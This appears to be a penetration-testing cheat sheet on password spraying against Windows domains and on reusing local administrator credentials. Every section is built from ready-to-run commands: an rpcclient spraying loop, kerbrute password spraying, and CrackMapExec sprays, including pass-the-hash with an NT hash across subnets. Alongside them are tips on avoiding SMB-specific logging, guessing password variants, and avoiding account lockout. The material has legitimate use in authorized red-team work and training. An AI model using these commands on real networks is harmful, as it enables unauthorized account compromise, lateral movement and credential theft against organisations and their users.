[MODE: full]

1. Valid user list and target password identified?
    - No: Perform user enumeration or wordlist generation first.
    - Yes: Proceed to **Internal Domain Password Spraying**.
2. Protocol availability check:
    - Kerberos (Port 88) available: Use **Kerbrute** for speed and to avoid SMB-specific logging.
    - RPC available: Use **rpcclient** if other tools are restricted.
    - SMB available: Use **CrackMapExec** for broad validation and easy output filtering.
3. Credentials captured?
    - Yes: Validate against Domain Controller.
4. Administrative access or local hashes obtained?
    - Yes: Proceed to **Local Administrator Credential Reuse**.
5. Are targets likely built from gold images?
    - Yes: Use **CrackMapExec** with `--local-auth` to spray across subnets.

---

## Internal Domain Password Spraying

Have a validated user list and need initial domain access from a Linux host.

Bash one-liner using RPC to spray a single password against a list of users

```
for u in $(cat <FILE_PATH>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET_IP> | grep Authority; done
```

Kerberos-based spraying for faster execution and different logging footprint

```
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <FILE_PATH> <PASSWORD>
```

SMB-based spraying with CrackMapExec to identify valid logins across the network

```
sudo crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p <PASSWORD> | grep +
```

Quick validation of a single set of discovered credentials against a DC

```
sudo crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD>
```

- **rpcclient**: `for u in $(cat <FILE_PATH>); do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <TARGET_IP> | grep Authority; done` -> Prefer when only RPC is exposed or other tools are blocked.
    
- **kerbrute**: `kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <FILE_PATH> <PASSWORD>` -> Prefer for speed and stealth against SMB-centric monitoring.
    
- **crackmapexec**: `sudo crackmapexec smb <TARGET_IP> -u <FILE_PATH> -p <PASSWORD> | grep +` -> Prefer for general purpose spraying and easy filtering.
    
- **Authority Name** output in rpcclient is the only indicator of success; failure to grep for this string will result in missing valid hits.
    

## Local Administrator Credential Reuse

Local admin cleartext or NT hash obtained in an environment likely using gold images or automated deployments.

Spray an NT hash across a subnet using local authentication to find reused admin passwords

```
sudo crackmapexec smb --local-auth <TARGET_IP> -u <USERNAME> -H <HASH> | grep +
```

- Omitting the `--local-auth` flag when targeting local accounts.
    
- Pattern matching: If a workstation uses a password like `$desktop%@admin123`, check if servers use `$server%@admin123`.
    
- Credential Parity: Check if a standard user password for `<USERNAME>` is reused for an administrative variant like `<USERNAME>_adm`.
    
- Cross-Domain: Credentials for a user in one domain may be valid for the same username in a trusted domain.
    
- **Account lockout** of the built-in domain administrator is a risk if the `--local-auth` flag is forgotten, as the tool defaults to domain authentication.
    
- **Noisy** traffic patterns make this technique a poor choice for engagements requiring high stealth.